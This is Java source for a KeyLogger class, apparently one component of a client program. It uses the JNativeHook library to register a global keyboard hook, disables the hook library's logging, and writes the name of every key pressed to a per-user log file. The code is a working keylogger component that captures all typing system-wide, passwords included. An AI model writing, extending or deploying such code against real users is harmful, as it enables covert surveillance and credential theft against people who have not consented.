package logger;

import client.User;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    final User user;
    KeyLoggerFile kf;

    public KeyLogger(User user) {
        this.user = user;
        kf = new KeyLoggerFile(user);

        try {
            GlobalScreen.registerNativeHook();
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
        } catch (NativeHookException e) {
            System.out.println("Error: " + e.getMessage());
        }

        GlobalScreen.addNativeKeyListener(this);
    }

    public static void main(String args[]) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent key) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent key) {
        CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
        try {
            kf.keyLoggerWriter(text);
        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent key) {
    }
}
